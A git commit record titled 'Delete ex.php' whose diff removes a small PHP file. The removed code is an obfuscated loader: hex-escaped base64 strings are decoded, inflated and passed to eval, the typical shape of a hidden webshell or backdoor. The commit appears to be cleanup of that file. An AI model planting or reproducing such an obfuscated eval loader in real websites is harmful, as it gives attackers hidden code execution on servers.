afb36ded15672f17cc3edf8fceae3b1c71fae5ab
Saeful Rochim <32793466+dalungid@users.noreply.github.com>
2024-10-24 00:21:59 +0700

    Delete ex.php

--- ex.php
+++
@@ -1,6 +0,0 @@
-<?php
-$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
-$Lix = "\x3d\x3dQfTNkogzkMtkfRzR\x43l\x2bo/h\x438vrL6fLJU12q\x61t4\x612yVfd\x63lhK\x43OwVohN\x61u\x63qlpskx53Uds5I\x62f\x41MDFo\x63MNw9m8Dm0kjJ\x62v8v5\x417dGkkNQW\x2bDk\x42\x2bLjhXR\x43FDhTXQUJi4smN3813Kee\x2bJ3uxSrX/EoI8gtj\x42EM4qj9T71Z\x62I6kYx\x428309F\x42\x42ID6wyN2y/F\x43ge\x42wJe/rH\x41FGw/1\x42gi\x42wJe/rG\x41VGw/l\x42gm\x42wJe/rF\x41lGw/V\x42gq\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-exit;
-?>
